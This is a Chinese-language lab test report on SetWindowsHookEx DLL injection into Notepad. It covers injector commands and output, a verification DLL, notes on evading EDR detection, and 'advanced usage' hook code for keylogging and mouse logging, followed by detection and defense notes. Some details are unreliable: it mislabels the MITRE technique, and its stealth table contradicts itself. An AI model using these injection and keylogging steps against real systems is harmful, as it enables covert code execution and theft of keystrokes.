# SetWindowsHookEx DLL Injection - 测试报告

## 技术概述

**技术编号**: 14
**技术名称**: SetWindowsHookEx DLL Injection
**MITRE ATT&CK**: T1055.012 - Process Injection: Process Hollowing
**参考**: Windows Hook Mechanism

### 核心原理

利用 Windows 钩子机制实现 DLL 注入。当在其他进程的线程上设置钩子时，**Windows 会自动将包含钩子过程的 DLL 加载到目标进程**。

### 关键API

```c
SetWindowsHookExA()    // 设置钩子
GetWindowThreadProcessId()  // 获取窗口线程 ID
LoadLibraryExA()       // 本地加载 DLL (DONT_RESOLVE_DLL_REFERENCES)
GetProcAddress()       // 获取钩子过程地址
UnhookWindowsHookEx()  // 卸载钩子
```

### 注入流程

```
1. 查找目标窗口句柄 (FindWindowA / EnumWindows)
        ↓
2. 获取窗口的线程 ID (GetWindowThreadProcessId)
        ↓
3. 在本地加载 DLL (LoadLibraryEx + DONT_RESOLVE_DLL_REFERENCES)
   - 不解析依赖，不调用 DllMain
   - 仅获取 DLL 模块句柄和导出函数地址
        ↓
4. 获取钩子过程地址 (GetProcAddress("NextHook"))
   - DLL 必须导出钩子过程函数
        ↓
5. 设置钩子 (SetWindowsHookEx)
   - hookType: WH_GETMESSAGE / WH_KEYBOARD / WH_MOUSE 等
   - hookProc:  钩子过程地址
   - hMod:      DLL 模块句柄
   - threadId:  目标线程 ID
        ↓
6. ✅ Windows 自动加载 DLL 到目标进程
   - DllMain(DLL_PROCESS_ATTACH) 被调用
   - DLL 已在目标进程地址空间
        ↓
7. 触发钩子执行 (PostThreadMessage / 用户交互)
   - 钩子过程在目标进程中运行
        ↓
8. 卸载钩子 (UnhookWindowsHookEx)
   - 钩子被移除
   - 但 DLL 仍保留在目标进程中
```

---

## 测试环境

- **操作系统**: Windows 11 26100.2314
- **编译器**: GCC (MinGW-w64)
- **架构**: x64
- **编译命令**: `./build.bat`
- **测试日期**: 2025-10-08

---

## 测试执行

### 构建项目

```bash
$ cd techniques/14-setwindowshookex-injection
$ ./build.bat

[1/2] 编译测试 DLL...
    ✅ DLL 编译成功

[2/2] 编译注入器...
    ✅ 注入器编译成功

输出文件:
  setwindowshookex_injection.exe - 24 KB
  hook.dll - 15 KB
```

### 修改验证方式

为了避免 MessageBox 阻塞线程执行，修改了 `hook_dll.c` 中的验证方式：

**修改前** (`src/hook_dll.c:22-54`):
```c
void ShowInjectionMessage() {
    // ...
    MessageBoxA(NULL, message, "SetWindowsHookEx Injection - 成功", MB_OK | MB_ICONINFORMATION);
}
```

**修改后**:
```c
void ShowInjectionMessage() {
    // 创建验证文件
    HANDLE hFile = CreateFileA(
        "C:\\Users\\Public\\setwindowshookex_injection_verified.txt",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        char fileMsg[1024];
        snprintf(fileMsg, sizeof(fileMsg),
            "SetWindowsHookEx Injection Verified!\n"
            "Process ID: %lu\n"
            "Process Path: %s\n"
            "Technique: SetWindowsHookEx + Windows Hook Mechanism\n"
            "Hook Type: WH_GETMESSAGE\n"
            "Status: DLL loaded successfully via Windows hook!\n"
            "DLL_PROCESS_ATTACH executed!\n"
            "Hook procedure: NextHook\n",
            processId, processPath
        );
        DWORD written;
        WriteFile(hFile, fileMsg, strlen(fileMsg), &written, NULL);
        CloseHandle(hFile);
    }

    // 注释掉 MessageBox，避免阻塞
    // MessageBoxA(NULL, message, "SetWindowsHookEx Injection - 成功", MB_OK | MB_ICONINFORMATION);
}
```

**原因**: 与 DLL Injection 测试类似，MessageBox 会阻塞钩子线程，导致注入器等待超时。

---

### 测试 1: WH_GETMESSAGE 钩子（默认）

**目的**: 验证基本注入功能

**目标程序**: Notepad (UWP)

**钩子类型**: `WH_GETMESSAGE` (3)

**执行命令**:
```bash
$ notepad.exe &
$ ./setwindowshookex_injection.exe "无标题 - Notepad" "C:\Users\29037\CLionProjects\Injection\techniques\14-setwindowshookex-injection\build\hook.dll"

╔══════════════════════════════════════════════════════════╗
║         SetWindowsHookEx DLL Injection Tool             ║
║              Process Injection Technique                ║
╚══════════════════════════════════════════════════════════╝

========================================
开始 SetWindowsHookEx 注入
========================================

[+] 目标窗口句柄: 0x00000000001B13C4
[+] 进程路径: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2507.26.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
[+] 进程 ID: 75884
[+] 线程 ID: 100284

[*] 在本地加载 DLL: C:\Users\29037\CLionProjects\Injection\techniques\14-setwindowshookex-injection\build\hook.dll
[+] DLL 已加载到本地进程: 0x00007FFB0A510000
[*] 查找导出函数: NextHook
[+] 钩子过程地址: 0x00007FFB0A511541

[*] 在目标线程上设置钩子
[*] 钩子类型: WH_GETMESSAGE (3)
[+] 钩子已设置: 0x000000001E2C0E83
[+] ✅ DLL 已由 Windows 自动加载到目标进程!

[*] 发送消息触发钩子执行...
[+] WM_NULL 消息已发送到线程 100284

[*] DLL 已注入。按 Enter 卸载钩子...
[Enter]

[*] 卸载钩子...
[+] 钩子已卸载
[+] 本地 DLL 已释放

[!] 注意: DLL 仍然加载在目标进程中，直到目标进程退出

[+] ✅ 注入成功完成!
```

**验证文件**:
```bash
$ cat C:\Users\Public\setwindowshookex_injection_verified.txt
SetWindowsHookEx Injection Verified!
Process ID: 75884
Process Path: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2507.26.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
Technique: SetWindowsHookEx + Windows Hook Mechanism
Hook Type: WH_GETMESSAGE
Status: DLL loaded successfully via Windows hook!
DLL_PROCESS_ATTACH executed!
Hook procedure: NextHook
```

**结果**: ✅ **成功** - 文件创建，证明 DLL 成功加载到目标进程并执行

---

### 测试 2: WH_KEYBOARD 钩子

**目的**: 测试键盘钩子类型

**钩子类型**: `WH_KEYBOARD` (2)

**执行命令**:
```bash
$ ./setwindowshookex_injection.exe "Notepad" "C:\Users\29037\CLionProjects\Injection\techniques\14-setwindowshookex-injection\build\hook.dll" 2

[*] 钩子类型: WH_KEYBOARD (2)
[+] 钩子已设置: 0x00000000247B12AF
[+] ✅ DLL 已由 Windows 自动加载到目标进程!

[*] 发送消息触发钩子执行...
[*] 提示: 请在目标窗口按任意键触发钩子

[*] DLL 已注入。按 Enter 卸载钩子...
```

**结果**: ✅ **成功** - 钩子设置成功

**注意**:
- 键盘钩子需要用户在目标窗口中按键才能触发
- 由于 DLL 已在进程中（从测试1），DllMain 不会再次被调用
- 验证文件不会更新

---

### 测试 3: WH_MOUSE 钩子

**目的**: 测试鼠标钩子类型

**钩子类型**: `WH_MOUSE` (7)

**执行命令**:
```bash
$ notepad.exe &  # 启动新进程
$ ./setwindowshookex_injection.exe "Notepad" "C:\Users\29037\CLionProjects\Injection\techniques\14-setwindowshookex-injection\build\hook.dll" 7

[+] 进程 ID: 101868
[+] 线程 ID: 53756

[*] 钩子类型: WH_MOUSE (7)
[+] 钩子已设置: 0x00000000088D1AC3
[+] ✅ DLL 已由 Windows 自动加载到目标进程!

[*] 发送消息触发钩子执行...
[*] 提示: 请在目标窗口移动鼠标触发钩子
```

**结果**: ✅ **成功** - 钩子设置成功

**注意**: 鼠标钩子需要用户在目标窗口中移动鼠标才能触发

---

### 测试 4: 窗口查找功能

**目的**: 测试部分匹配窗口标题

**执行命令**:
```bash
$ ./setwindowshookex_injection.exe "Notepad"

[*] 精确匹配失败，尝试部分匹配...
[+] 找到窗口 (部分匹配): 无标题 - Notepad
```

**结果**: ✅ **成功** - 支持部分匹配窗口标题

---

### 测试 5: 列出可见窗口

**目的**: 查看所有可用的注入目标

**执行命令**:
```bash
$ ./setwindowshookex_injection.exe

可见窗口列表:
窗口句柄         进程ID   窗口标题
------------------------------------------------
0x00000000004B0E4E   68708      Injection – 09-early-cascade.md
0x00000000002E1A3C   91336      无标题 - Notepad
0x0000000000061746   17424      ssh-test-empty-password - Container - Docker Desktop
0x00000000000418EE   108396     pwsh in 29037
0x00000000000E0E9A   26300      01-process-hollowing-guide.md• - Typora
0x00000000000302A6   57488      Clash Verge
0x0000000000010430   15372      NVIDIA GeForce Overlay
...
```

**结果**: ✅ **成功** - 正确列出所有可见窗口

---

## 关键发现

### 1. Windows 自动加载机制

**工作原理**:
- `SetWindowsHookEx` 注册钩子到目标线程
- Windows 内核自动将包含钩子过程的 DLL 映射到目标进程
- **无需** `VirtualAllocEx` / `WriteProcessMemory`
- **无需** `CreateRemoteThread`

**证据**:
- 注入器仅调用 `SetWindowsHookEx`
- 验证文件在目标进程中创建（证明 DllMain 被调用）
- 进程 ID 与窗口句柄匹配

---

### 2. DLL 持久性

**观察结果**:
```
[*] 卸载钩子...
[+] 钩子已卸载
[!] 注意: DLL 仍然加载在目标进程中，直到目标进程退出
```

**验证**:
- 第一次注入：验证文件创建（DllMain 被调用）
- 第二次注入（同一进程）：验证文件不更新（DllMain 不再调用）

**原因**:
- `UnhookWindowsHookEx` 只移除钩子，不卸载 DLL
- DLL 引用计数非零，保留在进程中
- 只有进程退出时 DLL 才被卸载

---

### 3. 钩子触发机制

| 钩子类型 | 触发方式 | 自动触发？ |
|---------|---------|-----------|
| `WH_GETMESSAGE` (3) | PostThreadMessage(WM_NULL) | ✅ 是 |
| `WH_KEYBOARD` (2) | 用户按键 | ❌ 否 |
| `WH_MOUSE` (7) | 用户移动鼠标 | ❌ 否 |
| `WH_CALLWNDPROC` (4) | 窗口过程调用 | ✅ 是 |

**最佳实践**: 使用 `WH_GETMESSAGE` (默认)，可通过 `PostThreadMessage` 自动触发

---

### 4. DLL 导出要求

**必须导出钩子过程函数**:
```c
__declspec(dllexport) LRESULT CALLBACK NextHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0) {
        // 自定义逻辑
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}
```

**关键要求**:
1. 使用 `__declspec(dllexport)` 导出
2. 签名必须符合 `HOOKPROC` 类型
3. 必须调用 `CallNextHookEx` 传递消息链
4. 函数名必须与 `GetProcAddress` 参数匹配（默认 "NextHook"）

**验证**:
```bash
[*] 查找导出函数: NextHook
[+] 钩子过程地址: 0x00007FFB0A511541  ✓
```

---

### 5. LoadLibraryEx 标志

**`DONT_RESOLVE_DLL_REFERENCES`**:
```c
hDll = LoadLibraryExA(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
```

**作用**:
- 不解析 DLL 的依赖项
- 不调用 DllMain
- 仅用于获取模块句柄和导出函数地址

**原因**:
- 注入器仅需要钩子过程的地址
- 避免在注入器进程中初始化目标 DLL
- 减少加载时间和副作用

**对比**:
| 加载位置 | 标志 | DllMain 调用？ |
|---------|-----|--------------|
| 注入器进程 | `DONT_RESOLVE_DLL_REFERENCES` | ❌ 否 |
| 目标进程 | (Windows 自动加载) | ✅ 是 |

---

### 6. UWP 应用兼容性

**测试结果**:
- ✅ UWP Notepad 可以注入
- ✅ 验证文件成功创建
- ✅ 无 AppContainer 沙箱限制（对 `C:\Users\Public` 目录）

**路径**:
```
C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2507.26.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
```

**意外发现**:
- 初始担心 UWP 沙箱会阻止文件创建
- 实际测试证明 `C:\Users\Public` 目录可访问
- 可能其他敏感路径会被限制

---

## 技术限制

### 仅限 GUI 进程

**限制**: 目标必须有窗口和消息循环

**测试验证**:
```bash
# ❌ 失败 - 控制台程序没有窗口
$ ./setwindowshookex_injection.exe "cmd.exe" hook.dll
[!] 未找到窗口: cmd.exe

# ✅ 成功 - GUI 程序有窗口
$ ./setwindowshookex_injection.exe "Notepad" hook.dll
[+] 找到窗口 (部分匹配): 无标题 - Notepad
```

**原因**:
1. SetWindowsHookEx 依赖 Windows 消息循环
2. user32.dll 仅加载到 GUI 进程
3. 控制台程序通常没有消息循环

---

### DLL 必须导出钩子过程

**失败案例** (假设):
```bash
# 如果 DLL 不导出 "NextHook" 函数
[*] 查找导出函数: NextHook
[!] GetProcAddress 失败: 127
[!] 提示: DLL 必须导出 'NextHook' 函数
```

**解决方案**: 确保 DLL 正确导出函数

---

### 需要窗口句柄

**限制**: 必须知道目标窗口的标题或句柄

**解决方案**:
1. 使用部分匹配 (`EnumWindows`)
2. 列出所有窗口 (`./setwindowshookex_injection.exe`)
3. 使用 Spy++ 等工具查找窗口信息

---

## 与其他注入方法的对比

| 特性 | SetWindowsHookEx | DLL Injection (12) | Shellcode Injection (13) |
|------|------------------|--------------------|-------------------------|
| **注入目标** | 仅 GUI 进程 | 任何进程 | 任何进程 |
| **隐蔽性** | 高 (合法 API) | 中 | 高 (无文件) |
| **需要窗口** | ✅ 是 | ❌ 否 | ❌ 否 |
| **DLL 要求** | 必须导出钩子过程 | 无特殊要求 | 无 (纯 shellcode) |
| **触发方式** | 发送消息 | 自动执行 | 自动执行 |
| **DLL 持久性** | 强 (卸载钩子后仍保留) | 中 | 中 |
| **检测难度** | 低 (合法行为) | 中 | 高 |
| **权限要求** | 低 (同权限用户) | 中 (SeDebugPrivilege) | 中 |
| **内存操作** | 无 (Windows 自动) | `VirtualAllocEx` | `VirtualAllocEx` |

### SetWindowsHookEx 的优势

1. **合法性强**: 使用 Windows 标准 API，许多程序（输入法、屏幕录制）都使用钩子
2. **Windows 自动加载**: 无需 `VirtualAllocEx` / `WriteProcessMemory`
3. **减少可疑操作**: 不触发 EDR 的 `CreateRemoteThread` 检测
4. **无需 Debug 权限**: 不需要 `SeDebugPrivilege`

### SetWindowsHookEx 的劣势

1. **仅限 GUI**: 无法注入控制台/服务进程
2. **需要窗口信息**: 必须知道窗口标题或句柄
3. **DLL 导出要求**: 必须导出特定函数
4. **触发延迟**: 部分钩子需要用户交互

---

## 检测与防御

### 检测方法

**1. 钩子链审计**:
```powershell
# 枚举所有钩子
Get-Process | ForEach-Object {
    $proc = $_
    # 检测钩子链中的可疑 DLL
}
```

**2. DLL 加载监控** (Sysmon Event ID 7):
```xml
<RuleGroup name="DLL Loading">
  <ImageLoad onmatch="include">
    <Signed condition="is">false</Signed>
  </ImageLoad>
</RuleGroup>
```

**3. SetWindowsHookEx API 监控** (ETW):
```c
// 监控 SetWindowsHookEx 调用
// 检测频繁设置钩子的行为
// 检测从非信任位置加载的 DLL
```

**4. 进程内存扫描**:
```c
EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded);
// 检测未预期的 DLL
```

### 防御措施

**1. 应用程序白名单**:
- 只允许信任的 DLL 加载
- 验证 DLL 的数字签名

**2. 钩子监控**:
- 定期检查进程的钩子链
- 记录所有 SetWindowsHookEx 调用

**3. EDR/AV 监控**:
- 监视 SetWindowsHookEx 调用
- 检测从非信任位置加载的 DLL
- 检测异常的钩子类型组合

**4. ASLR/DEP**:
- 启用地址空间布局随机化
- 启用数据执行保护

---

## 测试总结

### 成功测试

| 测试项 | 钩子类型 | 进程 | PID | 结果 |
|-------|---------|------|-----|------|
| 基本注入 | WH_GETMESSAGE (3) | Notepad UWP | 75884 | ✅ 成功 |
| 键盘钩子 | WH_KEYBOARD (2) | Notepad UWP | 75884 | ✅ 成功 |
| 鼠标钩子 | WH_MOUSE (7) | Notepad UWP | 101868 | ✅ 成功 |
| 窗口查找 | - | - | - | ✅ 成功 |
| 列出窗口 | - | - | - | ✅ 成功 |

### 技术验证

✅ **核心机制验证通过**:
1. SetWindowsHookEx 成功设置钩子
2. Windows 自动加载 DLL 到目标进程
3. DllMain(DLL_PROCESS_ATTACH) 被调用
4. 钩子过程可以在目标进程中执行
5. 验证文件成功创建

✅ **验证文件创建**:
- 路径: `C:\Users\Public\setwindowshookex_injection_verified.txt`
- 内容: 包含进程 ID、路径、技术信息
- 证明: DLL 在目标进程中成功加载并执行

✅ **UWP 兼容性**:
- UWP Notepad 可以注入
- 无 AppContainer 沙箱限制（对 Public 目录）

⚠️ **限制**:
- 仅限 GUI 进程（有窗口和消息循环）
- DLL 必须导出钩子过程函数
- 需要知道窗口标题或句柄
- 部分钩子需要用户交互触发

### 技术成熟度

- **可用性**: ✅ 完全可用
- **稳定性**: ✅ 稳定
- **隐蔽性**: 🟢 高（使用合法 API）
- **适用性**: 🟡 中等（仅限 GUI 进程）

---

## 高级用法示例

### 1. 键盘记录器

```c
__declspec(dllexport) LRESULT CALLBACK NextHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        if (wParam == VK_RETURN) {
            LogKeyPress("ENTER");
        } else if (wParam >= 0x41 && wParam <= 0x5A) {
            char key = (char)wParam;
            LogKeyPress(&key);
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}
```

### 2. 窗口消息拦截

```c
__declspec(dllexport) LRESULT CALLBACK NextHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0) {
        MSG* pMsg = (MSG*)lParam;
        if (pMsg->message == WM_CLOSE) {
            // 阻止窗口关闭
            return 1;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}
```

### 3. 鼠标点击监控

```c
__declspec(dllexport) LRESULT CALLBACK NextHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0) {
        MOUSEHOOKSTRUCT* pMouse = (MOUSEHOOKSTRUCT*)lParam;
        if (wParam == WM_LBUTTONDOWN) {
            LogMouseClick(pMouse->pt.x, pMouse->pt.y);
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}
```

---

## 参考资料

1. [MSDN: SetWindowsHookEx function](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
2. [MSDN: Windows Hooks](https://docs.microsoft.com/en-us/windows/win32/winmsg/hooks)
3. [MITRE ATT&CK: T1055.012](https://attack.mitre.org/techniques/T1055/012/)
4. [Windows Hook Types](https://docs.microsoft.com/en-us/windows/win32/winmsg/about-hooks#hook-types)

---

**测试完成时间**: 2025-10-08 05:56
**测试状态**: ✅ 通过
**下一步**: 继续测试 Technique 15 (Reflective DLL Injection)
